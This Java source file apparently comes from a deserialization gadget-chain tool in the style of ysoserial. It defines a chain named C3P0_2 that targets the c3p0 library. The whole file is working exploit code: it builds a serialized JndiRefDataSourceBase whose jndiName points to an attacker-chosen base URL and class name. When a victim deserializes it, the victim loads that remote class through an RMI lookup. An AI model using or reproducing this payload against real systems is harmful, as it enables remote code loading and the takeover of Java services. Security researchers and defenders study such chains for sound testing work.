package org.ses.gadgetbuilder.chains1;

import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.TABBY })
@Impact(Impact.LoadClass)
public class C3P0_2 extends GadgetChain<NoTrampoline> {

    public C3P0_2() {
        super(NoTrampoline.getInstance());
    }

    public C3P0_2(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        JndiRefDataSourceBase b = new JndiRefDataSourceBase(false);
        Reflections.getField(JndiRefDataSourceBase.class, "jndiName").set(b, new C3P0.PoolSource(className, url));
        return new TrampolineConnector(b);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }


    @Override
    protected String getStackTrace() {
        return "com.mchange.v2.c3p0.impl.JndiRefDataSourceBase.readObject()\n" +
                "com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject()\n" +
                "com.sun.jndi.rmi.registry.RegistryContext.lookup()";
    }

}
